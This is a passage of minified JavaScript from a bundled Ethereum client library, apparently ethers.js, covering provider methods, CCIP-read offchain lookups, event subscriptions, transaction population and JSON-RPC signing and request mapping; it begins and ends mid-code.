c=r[a],l=c.replace("{sender}",i).replace("{data}",s),f=new nd(l);c.indexOf("{data}")===-1&&(f.body={data:s,sender:i}),this.emit("debug",{action:"sendCcipReadFetchRequest",request:f,index:a,urls:r});let h="unknown error",m;try{m=await f.send()}catch(b){o.push(b.message),this.emit("debug",{action:"receiveCcipReadFetchError",request:f,result:{error:b}});continue}try{const b=m.bodyJson;if(b.data)return this.emit("debug",{action:"receiveCcipReadFetchResult",request:f,result:b}),b.data;b.message&&(h=b.message),this.emit("debug",{action:"receiveCcipReadFetchError",request:f,result:b})}catch{}qe(m.statusCode<400||m.statusCode>=500,`response not found during CCIP fetch: ${h}`,"OFFCHAIN_FAULT",{reason:"404_MISSING_RESOURCE",transaction:e,info:{url:c,errorMessage:h}}),o.push(h)}qe(!1,`error encountered during CCIP fetch: ${o.map(a=>JSON.stringify(a)).join(", ")}`,"OFFCHAIN_FAULT",{reason:"500_SERVER_ERROR",transaction:e,info:{urls:r,errorMessages:o}})}_wrapBlock(e,n){return new oLe(SLe(e),this)}_wrapLog(e,n){return new RA(ALe(e),this)}_wrapTransactionReceipt(e,n){return new Bue(RLe(e),this)}_wrapTransactionResponse(e,n){return new PA(Gue(e),this)}_detectNetwork(){qe(!1,"sub-classes must implement this","UNSUPPORTED_OPERATION",{operation:"_detectNetwork"})}async _perform(e){qe(!1,`unsupported method: ${e.method}`,"UNSUPPORTED_OPERATION",{operation:e.method,info:e})}async getBlockNumber(){const e=Qt(await this.#c({method:"getBlockNumber"}),"%response");return this.#a>=0&&(this.#a=e),e}_getAddress(e){return go(e,this)}_getBlockTag(e){if(e==null)return"latest";switch(e){case"earliest":return"0x0";case"finalized":case"latest":case"pending":case"safe":return e}if(gr(e))return gr(e,32)?e:Ru(e);if(typeof e=="bigint"&&(e=Qt(e,"blockTag")),typeof e=="number")return e>=0?Ru(e):this.#a>=0?Ru(this.#a+e):this.getBlockNumber().then(n=>Ru(n+e));pe(!1,"invalid blockTag","blockTag",e)}_getFilter(e){const n=(e.topics||[]).map(c=>c==null?null:Array.isArray(c)?AD(c.map(l=>l.toLowerCase())):c.toLowerCase()),r="blockHash"in e?e.blockHash:void 0,i=(c,l,f)=>{let h;switch(c.length){case 0:break;case 1:h=c[0];break;default:c.sort(),h=c}if(r&&(l!=null||f!=null))throw new Error("invalid filter");const m={};return h&&(m.address=h),n.length&&(m.topics=n),l&&(m.fromBlock=l),f&&(m.toBlock=f),r&&(m.blockHash=r),m};let s=[];if(e.address)if(Array.isArray(e.address))for(const c of e.address)s.push(this._getAddress(c));else s.push(this._getAddress(e.address));let o;"fromBlock"in e&&(o=this._getBlockTag(e.fromBlock));let a;return"toBlock"in e&&(a=this._getBlockTag(e.toBlock)),s.filter(c=>typeof c!="string").length||o!=null&&typeof o!="string"||a!=null&&typeof a!="string"?Promise.all([Promise.all(s),o,a]).then(c=>i(c[0],c[1],c[2])):i(s,o,a)}_getTransactionRequest(e){const n=yI(e),r=[];if(["to","from"].forEach(i=>{if(n[i]==null)return;const s=go(n[i],this);h6(s)?r.push((async function(){n[i]=await s})()):n[i]=s}),n.blockTag!=null){const i=this._getBlockTag(n.blockTag);h6(i)?r.push((async function(){n.blockTag=await i})()):n.blockTag=i}return r.length?(async function(){return await Promise.all(r),n})():n}async getNetwork(){if(this.#i==null){const i=(async()=>{try{const s=await this._detectNetwork();return this.emit("network",s,null),s}catch(s){throw this.#i===i&&(this.#i=null),s}})();return this.#i=i,(await i).clone()}const e=this.#i,[n,r]=await Promise.all([e,this._detectNetwork()]);return n.chainId!==r.chainId&&(this.#o?(this.emit("network",r,n),this.#i===e&&(this.#i=Promise.resolve(r))):qe(!1,`network changed: ${n.chainId} => ${r.chainId} `,"NETWORK_ERROR",{event:"changed"})),n.clone()}async getFeeData(){const e=await this.getNetwork(),n=async()=>{const{_block:i,gasPrice:s,priorityFee:o}=await ho({_block:this.#b("latest",!1),gasPrice:(async()=>{try{const f=await this.#c({method:"getGasPrice"});return wt(f,"%response")}catch{}return null})(),priorityFee:(async()=>{try{const f=await this.#c({method:"getPriorityFee"});return wt(f,"%response")}catch{}return null})()});let a=null,c=null;const l=this._wrapBlock(i,e);return l&&l.baseFeePerGas&&(c=o??BigInt("1000000000"),a=l.baseFeePerGas*MLe+c),new WG(s,a,c)},r=e.getPlugin("org.ethers.plugins.network.FetchUrlFeeDataPlugin");if(r){const i=new nd(r.url),s=await r.processFunc(n,this,i);return new WG(s.gasPrice,s.maxFeePerGas,s.maxPriorityFeePerGas)}return await n()}async estimateGas(e){let n=this._getTransactionRequest(e);return h6(n)&&(n=await n),wt(await this.#c({method:"estimateGas",transaction:n}),"%response")}async#l(e,n,r){qe(r<ULe,"CCIP read exceeded maximum redirections","OFFCHAIN_FAULT",{reason:"TOO_MANY_REDIRECTS",transaction:Object.assign({},e,{blockTag:n,enableCcipRead:!0})});const i=yI(e);try{return rt(await this._perform({method:"call",transaction:i,blockTag:n}))}catch(s){if(!this.disableCcipRead&&fj(s)&&s.data&&r>=0&&n==="latest"&&i.to!=null&&si(s.data,0,4)==="0x556f1830"){const o=s.data,a=await go(i.to,this);let c;try{c=WLe(si(s.data,4))}catch(h){qe(!1,h.message,"OFFCHAIN_FAULT",{reason:"BAD_DATA",transaction:i,info:{data:o}})}qe(c.sender.toLowerCase()===a.toLowerCase(),"CCIP Read sender mismatch","CALL_EXCEPTION",{action:"call",data:o,reason:"OffchainLookup",transaction:i,invocation:null,revert:{signature:"OffchainLookup(address,string[],bytes,bytes4,bytes)",name:"OffchainLookup",args:c.errorArgs}});const l=await this.ccipReadFetch(i,c.calldata,c.urls);qe(l!=null,"CCIP Read failed to fetch data","OFFCHAIN_FAULT",{reason:"FETCH_FAILED",transaction:i,info:{data:s.data,errorArgs:c.errorArgs}});const f={to:a,data:Lr([c.selector,VLe([l,c.extraData])])};this.emit("debug",{action:"sendCcipReadCall",transaction:f});try{const h=await this.#l(f,n,r+1);return this.emit("debug",{action:"receiveCcipReadCallResult",transaction:Object.assign({},f),result:h}),h}catch(h){throw this.emit("debug",{action:"receiveCcipReadCallError",transaction:Object.assign({},f),error:h}),h}}throw s}}async#f(e){const{value:n}=await ho({network:this.getNetwork(),value:e});return n}async call(e){const{tx:n,blockTag:r}=await ho({tx:this._getTransactionRequest(e),blockTag:this._getBlockTag(e.blockTag)});return await this.#f(this.#l(n,r,e.enableCcipRead?0:-1))}async#h(e,n,r){let i=this._getAddress(n),s=this._getBlockTag(r);return(typeof i!="string"||typeof s!="string")&&([i,s]=await Promise.all([i,s])),await this.#f(this.#c(Object.assign(e,{address:i,blockTag:s})))}async getBalance(e,n){return wt(await this.#h({method:"getBalance"},e,n),"%response")}async getTransactionCount(e,n){return Qt(await this.#h({method:"getTransactionCount"},e,n),"%response")}async getCode(e,n){return rt(await this.#h({method:"getCode"},e,n))}async getStorage(e,n,r){const i=wt(n,"position");return rt(await this.#h({method:"getStorage",position:i},e,r))}async broadcastTransaction(e){const{blockNumber:n,hash:r,network:i}=await ho({blockNumber:this.getBlockNumber(),hash:this._perform({method:"broadcastTransaction",signedTransaction:e}),network:this.getNetwork()}),s=xu.from(e);if(s.hash!==r)throw new Error("@TODO: the returned hash did not match");return this._wrapTransactionResponse(s,i).replaceableTransaction(n)}async#b(e,n){if(gr(e,32))return await this.#c({method:"getBlock",blockHash:e,includeTransactions:n});let r=this._getBlockTag(e);return typeof r!="string"&&(r=await r),await this.#c({method:"getBlock",blockTag:r,includeTransactions:n})}async getBlock(e,n){const{network:r,params:i}=await ho({network:this.getNetwork(),params:this.#b(e,!!n)});return i==null?null:this._wrapBlock(i,r)}async getTransaction(e){const{network:n,params:r}=await ho({network:this.getNetwork(),params:this.#c({method:"getTransaction",hash:e})});return r==null?null:this._wrapTransactionResponse(r,n)}async getTransactionReceipt(e){const{network:n,params:r}=await ho({network:this.getNetwork(),params:this.#c({method:"getTransactionReceipt",hash:e})});if(r==null)return null;if(r.gasPrice==null&&r.effectiveGasPrice==null){const i=await this.#c({method:"getTransaction",hash:e});if(i==null)throw new Error("report this; could not find tx or effectiveGasPrice");r.effectiveGasPrice=i.gasPrice}return this._wrapTransactionReceipt(r,n)}async getTransactionResult(e){const{result:n}=await ho({network:this.getNetwork(),result:this.#c({method:"getTransactionResult",hash:e})});return n==null?null:rt(n)}async getLogs(e){let n=this._getFilter(e);h6(n)&&(n=await n);const{network:r,params:i}=await ho({network:this.getNetwork(),params:this.#c({method:"getLogs",filter:n})});return i.map(s=>this._wrapLog(s,r))}_getProvider(e){qe(!1,"provider cannot connect to target network","UNSUPPORTED_OPERATION",{operation:"_getProvider()"})}async getResolver(e){return await l1.fromName(this,e)}async getAvatar(e){const n=await this.getResolver(e);return n?await n.getAvatar():null}async resolveName(e){const n=await this.getResolver(e);return n?await n.getAddress():null}async lookupAddress(e){e=Vn(e);const n=wD(e.substring(2).toLowerCase()+".addr.reverse");try{const r=await l1.getEnsAddress(this),s=await new vp(r,["function resolver(bytes32) view returns (address)"],this).resolver(n);if(s==null||s===x_)return null;const a=await new vp(s,["function name(bytes32) view returns (string)"],this).name(n);return await this.resolveName(a)!==e?null:a}catch(r){if(Ss(r,"BAD_DATA")&&r.value==="0x"||Ss(r,"CALL_EXCEPTION"))return null;throw r}return null}async waitForTransaction(e,n,r){const i=n??1;return i===0?this.getTransactionReceipt(e):new Promise(async(s,o)=>{let a=null;const c=(async l=>{try{const f=await this.getTransactionReceipt(e);if(f!=null&&l-f.blockNumber+1>=i){s(f),a&&(clearTimeout(a),a=null);return}}catch(f){console.log("EEE",f)}this.once("block",c)});r!=null&&(a=setTimeout(()=>{a!=null&&(a=null,this.off("block",c),o(Mr("timeout","TIMEOUT",{reason:"timeout"})))},r)),c(await this.getBlockNumber())})}async waitForBlock(e){qe(!1,"not implemented yet","NOT_IMPLEMENTED",{operation:"waitForBlock"})}_clearTimeout(e){const n=this.#u.get(e);n&&(n.timer&&clearTimeout(n.timer),this.#u.delete(e))}_setTimeout(e,n){n==null&&(n=0);const r=this.#d++,i=()=>{this.#u.delete(r),e()};if(this.paused)this.#u.set(r,{timer:null,func:i,time:n});else{const s=setTimeout(i,n);this.#u.set(r,{timer:s,func:i,time:jO()})}return r}_forEachSubscriber(e){for(const n of this.#e.values())e(n.subscriber)}_getSubscriber(e){switch(e.type){case"debug":case"error":case"network":return new Kue(e.type);case"block":{const n=new kLe(this);return n.pollingInterval=this.pollingInterval,n}case"safe":case"finalized":return new DLe(this,e.type);case"event":return new Oj(this,e.filter);case"transaction":return new jLe(this,e.hash);case"orphan":return new BLe(this,e.filter)}throw new Error(`unsupported event: ${e.type}`)}_recoverSubscriber(e,n){for(const r of this.#e.values())if(r.subscriber===e){r.started&&r.subscriber.stop(),r.subscriber=n,r.started&&n.start(),this.#n!=null&&n.pause(this.#n);break}}async#g(e,n){let r=await BO(e,this);return r.type==="event"&&n&&n.length>0&&n[0].removed===!0&&(r=await BO({orphan:"drop-log",log:n[0]},this)),this.#e.get(r.tag)||null}async#y(e){const n=await BO(e,this),r=n.tag;let i=this.#e.get(r);return i||(i={subscriber:this._getSubscriber(n),tag:r,addressableMap:new WeakMap,nameMap:new Map,started:!1,listeners:[]},this.#e.set(r,i)),i}async on(e,n){const r=await this.#y(e);return r.listeners.push({listener:n,once:!1}),r.started||(r.subscriber.start(),r.started=!0,this.#n!=null&&r.subscriber.pause(this.#n)),this}async once(e,n){const r=await this.#y(e);return r.listeners.push({listener:n,once:!0}),r.started||(r.subscriber.start(),r.started=!0,this.#n!=null&&r.subscriber.pause(this.#n)),this}async emit(e,...n){const r=await this.#g(e,n);if(!r||r.listeners.length===0)return!1;const i=r.listeners.length;return r.listeners=r.listeners.filter(({listener:s,once:o})=>{const a=new dce(this,o?null:s,e);try{s.call(this,...n,a)}catch{}return!o}),r.listeners.length===0&&(r.started&&r.subscriber.stop(),this.#e.delete(r.tag)),i>0}async listenerCount(e){if(e){const r=await this.#g(e);return r?r.listeners.length:0}let n=0;for(const{listeners:r}of this.#e.values())n+=r.length;return n}async listeners(e){if(e){const r=await this.#g(e);return r?r.listeners.map(({listener:i})=>i):[]}let n=[];for(const{listeners:r}of this.#e.values())n=n.concat(r.map(({listener:i})=>i));return n}async off(e,n){const r=await this.#g(e);if(!r)return this;if(n){const i=r.listeners.map(({listener:s})=>s).indexOf(n);i>=0&&r.listeners.splice(i,1)}return(!n||r.listeners.length===0)&&(r.started&&r.subscriber.stop(),this.#e.delete(r.tag)),this}async removeAllListeners(e){if(e){const{tag:n,started:r,subscriber:i}=await this.#y(e);r&&i.stop(),this.#e.delete(n)}else for(const[n,{started:r,subscriber:i}]of this.#e)r&&i.stop(),this.#e.delete(n);return this}async addListener(e,n){return await this.on(e,n)}async removeListener(e,n){return this.off(e,n)}get destroyed(){return this.#r}destroy(){this.removeAllListeners();for(const e of this.#u.keys())this._clearTimeout(e);this.#r=!0}get paused(){return this.#n!=null}set paused(e){!!e!==this.paused&&(this.paused?this.resume():this.pause(!1))}pause(e){if(this.#a=-1,this.#n!=null){if(this.#n==!!e)return;qe(!1,"cannot change pause type; resume first","UNSUPPORTED_OPERATION",{operation:"pause"})}this._forEachSubscriber(n=>n.pause(e)),this.#n=!!e;for(const n of this.#u.values())n.timer&&clearTimeout(n.timer),n.time=jO()-n.time}resume(){if(this.#n!=null){this._forEachSubscriber(e=>e.resume()),this.#n=null;for(const e of this.#u.values()){let n=e.time;n<0&&(n=0),e.time=jO(),setTimeout(e.func,n)}}}}function HLe(t,e){try{const n=CD(t,e);if(n)return lI(n)}catch{}return null}function CD(t,e){if(t==="0x")return null;try{const n=Qt(si(t,e,e+32)),r=Qt(si(t,n,n+32));return si(t,n+32,n+32+r)}catch{}return null}function eK(t){const e=Di(t);if(e.length>32)throw new Error("internal; should not happen");const n=new Uint8Array(32);return n.set(e,32-e.length),n}function zLe(t){if(t.length%32===0)return t;const e=new Uint8Array(Math.ceil(t.length/32)*32);return e.set(t),e}const qLe=new Uint8Array([]);function VLe(t){const e=[];let n=0;for(let r=0;r<t.length;r++)e.push(qLe),n+=32;for(let r=0;r<t.length;r++){const i=an(t[r]);e[r]=eK(n),e.push(eK(i.length)),e.push(zLe(i)),n+=32+Math.ceil(i.length/32)*32}return Lr(e)}const tK="0x0000000000000000000000000000000000000000000000000000000000000000";function WLe(t){const e={sender:"",urls:[],calldata:"",selector:"",extraData:"",errorArgs:[]};qe(o1(t)>=160,"insufficient OffchainLookup data","OFFCHAIN_FAULT",{reason:"insufficient OffchainLookup data"});const n=si(t,0,32);qe(si(n,0,12)===si(tK,0,12),"corrupt OffchainLookup sender","OFFCHAIN_FAULT",{reason:"corrupt OffchainLookup sender"}),e.sender=si(n,12);try{const r=[],i=Qt(si(t,32,64)),s=Qt(si(t,i,i+32)),o=si(t,i+32);for(let a=0;a<s;a++){const c=HLe(o,a*32);if(c==null)throw new Error("abort");r.push(c)}e.urls=r}catch{qe(!1,"corrupt OffchainLookup urls","OFFCHAIN_FAULT",{reason:"corrupt OffchainLookup urls"})}try{const r=CD(t,64);if(r==null)throw new Error("abort");e.calldata=r}catch{qe(!1,"corrupt OffchainLookup calldata","OFFCHAIN_FAULT",{reason:"corrupt OffchainLookup calldata"})}qe(si(t,100,128)===si(tK,0,28),"corrupt OffchainLookup callbaackSelector","OFFCHAIN_FAULT",{reason:"corrupt OffchainLookup callbaackSelector"}),e.selector=si(t,96,100);try{const r=CD(t,128);if(r==null)throw new Error("abort");e.extraData=r}catch{qe(!1,"corrupt OffchainLookup extraData","OFFCHAIN_FAULT",{reason:"corrupt OffchainLookup extraData"})}return e.errorArgs="sender,urls,calldata,selector,extraData".split(/,/).map(r=>e[r]),e}function tm(t,e){if(t.provider)return t.provider;qe(!1,"missing provider","UNSUPPORTED_OPERATION",{operation:e})}async function nK(t,e){let n=yI(e);if(n.to!=null&&(n.to=go(n.to,t)),n.from!=null){const r=n.from;n.from=Promise.all([t.getAddress(),go(r,t)]).then(([i,s])=>(pe(i.toLowerCase()===s.toLowerCase(),"transaction from mismatch","tx.from",s),i))}else n.from=t.getAddress();return await ho(n)}class GLe{provider;constructor(e){Lt(this,{provider:e||null})}async getNonce(e){return tm(this,"getTransactionCount").getTransactionCount(await this.getAddress(),e)}async populateCall(e){return await nK(this,e)}async populateTransaction(e){const n=tm(this,"populateTransaction"),r=await nK(this,e);r.nonce==null&&(r.nonce=await this.getNonce("pending")),r.gasLimit==null&&(r.gasLimit=await this.estimateGas(r));const i=await this.provider.getNetwork();if(r.chainId!=null){const o=wt(r.chainId);pe(o===i.chainId,"transaction chainId mismatch","tx.chainId",e.chainId)}else r.chainId=i.chainId;const s=r.maxFeePerGas!=null||r.maxPriorityFeePerGas!=null;if(r.gasPrice!=null&&(r.type===2||s)?pe(!1,"eip-1559 transaction do not support gasPrice","tx",e):(r.type===0||r.type===1)&&s&&pe(!1,"pre-eip-1559 transaction do not support maxFeePerGas/maxPriorityFeePerGas","tx",e),(r.type===2||r.type==null)&&r.maxFeePerGas!=null&&r.maxPriorityFeePerGas!=null)r.type=2;else if(r.type===0||r.type===1){const o=await n.getFeeData();qe(o.gasPrice!=null,"network does not support gasPrice","UNSUPPORTED_OPERATION",{operation:"getGasPrice"}),r.gasPrice==null&&(r.gasPrice=o.gasPrice)}else{const o=await n.getFeeData();if(r.type==null)if(o.maxFeePerGas!=null&&o.maxPriorityFeePerGas!=null)if(r.authorizationList&&r.authorizationList.length?r.type=4:r.type=2,r.gasPrice!=null){const a=r.gasPrice;delete r.gasPrice,r.maxFeePerGas=a,r.maxPriorityFeePerGas=a}else r.maxFeePerGas==null&&(r.maxFeePerGas=o.maxFeePerGas),r.maxPriorityFeePerGas==null&&(r.maxPriorityFeePerGas=o.maxPriorityFeePerGas);else o.gasPrice!=null?(qe(!s,"network does not support EIP-1559","UNSUPPORTED_OPERATION",{operation:"populateTransaction"}),r.gasPrice==null&&(r.gasPrice=o.gasPrice),r.type=0):qe(!1,"failed to get consistent fee data","UNSUPPORTED_OPERATION",{operation:"signer.getFeeData"});else(r.type===2||r.type===3||r.type===4)&&(r.maxFeePerGas==null&&(r.maxFeePerGas=o.maxFeePerGas),r.maxPriorityFeePerGas==null&&(r.maxPriorityFeePerGas=o.maxPriorityFeePerGas))}return await ho(r)}async populateAuthorization(e){const n=Object.assign({},e);return n.chainId==null&&(n.chainId=(await tm(this,"getNetwork").getNetwork()).chainId),n.nonce==null&&(n.nonce=await this.getNonce()),n}async estimateGas(e){return tm(this,"estimateGas").estimateGas(await this.populateCall(e))}async call(e){return tm(this,"call").call(await this.populateCall(e))}async resolveName(e){return await tm(this,"resolveName").resolveName(e)}async sendTransaction(e){const n=tm(this,"sendTransaction"),r=await this.populateTransaction(e);delete r.from;const i=xu.from(r);return await n.broadcastTransaction(await this.signTransaction(i))}authorize(e){qe(!1,"authorization not implemented for this signer","UNSUPPORTED_OPERATION",{operation:"authorize"})}}function KLe(t){return JSON.parse(JSON.stringify(t))}class Zue{#e;#t;#n;#r;#i;#o;constructor(e){this.#e=e,this.#t=null,this.#n=this.#s.bind(this),this.#r=!1,this.#i=null,this.#o=!1}_subscribe(e){throw new Error("subclasses must override this")}_emitResults(e,n){throw new Error("subclasses must override this")}_recover(e){throw new Error("subclasses must override this")}async#s(e){try{this.#t==null&&(this.#t=this._subscribe(this.#e));let n=null;try{n=await this.#t}catch(s){if(!Ss(s,"UNSUPPORTED_OPERATION")||s.operation!=="eth_newFilter")throw s}if(n==null){this.#t=null,this.#e._recoverSubscriber(this,this._recover(this.#e));return}const r=await this.#e.getNetwork();if(this.#i||(this.#i=r),this.#i.chainId!==r.chainId)throw new Error("chaid changed");if(this.#o)return;const i=await this.#e.send("eth_getFilterChanges",[n]);await this._emitResults(this.#e,i)}catch(n){console.log("@TODO",n)}this.#e.once("block",this.#n)}#a(){const e=this.#t;e&&(this.#t=null,e.then(n=>{this.#e.destroyed||this.#e.send("eth_uninstallFilter",[n])}))}start(){this.#r||(this.#r=!0,this.#s(-2))}stop(){this.#r&&(this.#r=!1,this.#o=!0,this.#a(),this.#e.off("block",this.#n))}pause(e){e&&this.#a(),this.#e.off("block",this.#n)}resume(){this.start()}}class ZLe extends Zue{#e;constructor(e,n){super(e),this.#e=KLe(n)}_recover(e){return new Oj(e,this.#e)}async _subscribe(e){return await e.send("eth_newFilter",[this.#e])}async _emitResults(e,n){for(const r of n)e.emit(this.#e,e._wrapLog(r,e._network))}}class YLe extends Zue{async _subscribe(e){return await e.send("eth_newPendingTransactionFilter",[])}async _emitResults(e,n){for(const r of n)e.emit("pending",r)}}const QLe="bigint,boolean,function,number,string,symbol".split(/,/g);function XT(t){if(t==null||QLe.indexOf(typeof t)>=0||typeof t.getAddress=="function")return t;if(Array.isArray(t))return t.map(XT);if(typeof t=="object")return Object.keys(t).reduce((e,n)=>(e[n]=t[n],e),{});throw new Error(`should not happen: ${t} (${typeof t})`)}function JLe(t){return new Promise(e=>{setTimeout(e,t)})}function fb(t){return t&&t.toLowerCase()}function rK(t){return t&&typeof t.pollingInterval=="number"}const Yue={polling:!1,staticNetwork:null,batchStallTime:10,batchMaxSize:1<<20,batchMaxCount:100,cacheTimeout:250,pollingInterval:4e3};class d1 extends GLe{address;constructor(e,n){super(e),n=Vn(n),Lt(this,{address:n})}connect(e){qe(!1,"cannot reconnect JsonRpcSigner","UNSUPPORTED_OPERATION",{operation:"signer.connect"})}async getAddress(){return this.address}async populateTransaction(e){return await this.populateCall(e)}async sendUncheckedTransaction(e){const n=XT(e),r=[];if(n.from){const s=n.from;r.push((async()=>{const o=await go(s,this.provider);pe(o!=null&&o.toLowerCase()===this.address.toLowerCase(),"from address mismatch","transaction",e),n.from=o})())}else n.from=this.address;if(n.gasLimit==null&&r.push((async()=>{n.gasLimit=await this.provider.estimateGas({...n,from:this.address})})()),n.to!=null){const s=n.to;r.push((async()=>{n.to=await go(s,this.provider)})())}r.length&&await Promise.all(r);const i=this.provider.getRpcTransaction(n);return this.provider.send("eth_sendTransaction",[i])}async sendTransaction(e){const n=await this.provider.getBlockNumber(),r=await this.sendUncheckedTransaction(e);return await new Promise((i,s)=>{const o=[1e3,100];let a=0;const c=async()=>{try{const l=await this.provider.getTransaction(r);if(l!=null){i(l.replaceableTransaction(n));return}}catch(l){if(Ss(l,"CANCELLED")||Ss(l,"BAD_DATA")||Ss(l,"NETWORK_ERROR")||Ss(l,"UNSUPPORTED_OPERATION")){l.info==null&&(l.info={}),l.info.sendTransactionHash=r,s(l);return}if(Ss(l,"INVALID_ARGUMENT")&&(a++,l.info==null&&(l.info={}),l.info.sendTransactionHash=r,a>10)){s(l);return}this.provider.emit("error",Mr("failed to fetch transation after sending (will try again)","UNKNOWN_ERROR",{error:l}))}this.provider._setTimeout(()=>{c()},o.pop()||4e3)};c()})}async signTransaction(e){const n=XT(e);if(n.from){const i=await go(n.from,this.provider);pe(i!=null&&i.toLowerCase()===this.address.toLowerCase(),"from address mismatch","transaction",e),n.from=i}else n.from=this.address;const r=this.provider.getRpcTransaction(n);return await this.provider.send("eth_signTransaction",[r])}async signMessage(e){const n=typeof e=="string"?Hl(e):e;return await this.provider.send("personal_sign",[rt(n),this.address.toLowerCase()])}async signTypedData(e,n,r){const i=XT(r),s=await $a.resolveNames(e,n,i,async o=>{const a=await go(o);return pe(a!=null,"TypedData does not support null address","value",o),a});return await this.provider.send("eth_signTypedData_v4",[this.address.toLowerCase(),JSON.stringify($a.getPayload(s.domain,n,s.value))])}async unlock(e){return this.provider.send("personal_unlockAccount",[this.address.toLowerCase(),e,null])}async _legacySignMessage(e){const n=typeof e=="string"?Hl(e):e;return await this.provider.send("eth_sign",[this.address.toLowerCase(),rt(n)])}}class XLe extends $Le{#e;#t;#n;#r;#i;#o;#s;#a(){if(this.#r)return;const e=this._getOption("batchMaxCount")===1?0:this._getOption("batchStallTime");this.#r=setTimeout(()=>{this.#r=null;const n=this.#n;for(this.#n=[];n.length;){const r=[n.shift()];for(;n.length&&r.length!==this.#e.batchMaxCount;)if(r.push(n.shift()),JSON.stringify(r.map(s=>s.payload)).length>this.#e.batchMaxSize){n.unshift(r.pop());break}(async()=>{const i=r.length===1?r[0].payload:r.map(s=>s.payload);this.emit("debug",{action:"sendRpcPayload",payload:i});try{const s=await this._send(i);this.emit("debug",{action:"receiveRpcResult",result:s});for(const{resolve:o,reject:a,payload:c}of r){if(this.destroyed){a(Mr("provider destroyed; cancelled request","UNSUPPORTED_OPERATION",{operation:c.method}));continue}const l=s.filter(f=>f.id===c.id)[0];if(l==null){const f=Mr("missing response for request","BAD_DATA",{value:s,info:{payload:c}});this.emit("error",f),a(f);continue}if("error"in l){a(this.getRpcError(c,l));continue}o(l.result)}}catch(s){this.emit("debug",{action:"receiveRpcError",error:s});for(const{reject:o}of r)o(s)}})()}},e)}constructor(e,n){super(e,n),this.#t=1,this.#e=Object.assign({},Yue,n||{}),this.#n=[],this.#r=null,this.#o=null,this.#s=null;{let i=null;const s=new Promise(o=>{i=o});this.#i={promise:s,resolve:i}}const r=this._getOption("staticNetwork");typeof r=="boolean"?(pe(!r||e!=="any","staticNetwork cannot be used on special network 'any'","options",n),r&&e!=null&&(this.#o=Ya.from(e))):r&&(pe(e==null||r.matches(e),"staticNetwork MUST match network object","options",n),this.#o=r)}_getOption(e){return this.#e[e]}get _network(){return qe(this.#o,"network is not available yet","NETWORK_ERROR"),this.#o}async _perform(e){if(e.method==="call"||e.method==="estimateGas"){let r=e.transaction;if(r&&r.type!=null&&wt(r.type)&&r.maxFeePerGas==null&&r.maxPriorityFeePerGas==null){const i=await this.getFeeData();i.maxFeePerGas==null&&i.maxPriorityFeePerGas==null&&(e=Object.assign({},e,{transaction:Object.assign({},r,{type:void 0})}))}}const n=this.getRpcRequest(e);return n!=null?await this.send(n.method,n.args):super._perform(e)}async _detectNetwork(){const e=this._getOption("staticNetwork");if(e)if(e===!0){if(this.#o)return this.#o}else return e;return this.#s?await this.#s:this.ready?(this.#s=(async()=>{try{const n=Ya.from(wt(await this.send("eth_chainId",[])));return this.#s=null,n}catch(n){throw this.#s=null,n}})(),await this.#s):(this.#s=(async()=>{const n={id:this.#t++,method:"eth_chainId",params:[],jsonrpc:"2.0"};this.emit("debug",{action:"sendRpcPayload",payload:n});let r;try{r=(await this._send(n))[0],this.#s=null}catch(i){throw this.#s=null,this.emit("debug",{action:"receiveRpcError",error:i}),i}if(this.emit("debug",{action:"receiveRpcResult",result:r}),"result"in r)return Ya.from(wt(r.result));throw this.getRpcError(n,r)})(),await this.#s)}_start(){this.#i==null||this.#i.resolve==null||(this.#i.resolve(),this.#i=null,(async()=>{for(;this.#o==null&&!this.destroyed;)try{this.#o=await this._detectNetwork()}catch(e){if(this.destroyed)break;console.log("JsonRpcProvider failed to detect network and cannot start up; retry in 1s (perhaps the URL is wrong or the node is not started)"),this.emit("error",Mr("failed to bootstrap network detection","NETWORK_ERROR",{event:"initial-network-discovery",info:{error:e}})),await JLe(1e3)}this.#a()})())}async _waitUntilReady(){if(this.#i!=null)return await this.#i.promise}_getSubscriber(e){return e.type==="pending"?new YLe(this):e.type==="event"?this._getOption("polling")?new Oj(this,e.filter):new ZLe(this,e.filter):e.type==="orphan"&&e.filter.orphan==="drop-log"?new Kue("orphan"):super._getSubscriber(e)}get ready(){return this.#i==null}getRpcTransaction(e){const n={};return["chainId","gasLimit","gasPrice","type","maxFeePerGas","maxPriorityFeePerGas","nonce","value"].forEach(r=>{if(e[r]==null)return;let i=r;r==="gasLimit"&&(i="gas"),n[i]=Ru(wt(e[r],`tx.${r}`))}),["from","to","data"].forEach(r=>{e[r]!=null&&(n[r]=rt(e[r]))}),e.accessList&&(n.accessList=ty(e.accessList)),e.blobVersionedHashes&&(n.blobVersionedHashes=e.blobVersionedHashes.map(r=>r.toLowerCase())),e.authorizationList&&(n.authorizationList=e.authorizationList.map(r=>{const i=tue(r);return{address:i.address,nonce:Ru(i.nonce),chainId:Ru(i.chainId),yParity:Ru(i.signature.yParity),r:Ru(i.signature.r),s:Ru(i.signature.s)}})),n}getRpcRequest(e){switch(e.method){case"chainId":return{method:"eth_chainId",args:[]};case"getBlockNumber":return{method:"eth_blockNumber",args:[]};case"getGasPrice":return{method:"eth_gasPrice",args:[]};case"getPriorityFee":return{method:"eth_maxPriorityFeePerGas",args:[]};case"getBalance":return{method:"eth_getBalance",args:[fb(e.address),e.blockTag]};case"getTransactionCount":return{method:"eth_getTransactionCount",args:[fb(e.address),e.blockTag]};case"getCode":return{method:"eth_getCode",args:[fb(e.address),e.blockTag]};case"getStorage":return{method:"eth_getStorageAt",args:[fb(e.address),"0x"+e.position.toString(16),e.blockTag]};case"broadcastTransaction":return{method:"eth_sendRawTransaction",args:[e.signedTransaction]};case"getBlock":if("blockTag"in e)return{method:"eth_getBlockByNumber",args:[e.blockTag,!!e.includeTransactions]};if("blockHash"in e)return{method:"eth_getBlockByHash",args:[e.blockHash,!!e.includeTransactions]};break;case"getTransaction":return{method:"eth_getTransactionByHash",args:[e.hash]};case"getTransactionReceipt":return{method:"eth_getTransactionReceipt",args:[e.hash]};case"call":return{method:"eth_call",args:[this.getRpcTransaction(e.transaction),e.blockTag]};case"estimateGas":return{method:"eth_estimateGas",args:[this.getRpcTransaction(e.transaction)]};case"getLogs":return e.filter&&e.filter.address!=null&&(Array.isArray(e.filter.address)?e.filter.address=e.filter.address.map(fb):e.filter.address=fb(e.filter.address)),{method:"eth_getLogs",args:[e.filter]}}return null}getRpcError(e,n){const{method:r}=e,{error:i}=n;if(r==="eth_estimateGas"&&i.message){const a=i.message;if(!a.match(/revert/i)&&a.match(/insufficient funds/i))return Mr("insufficient 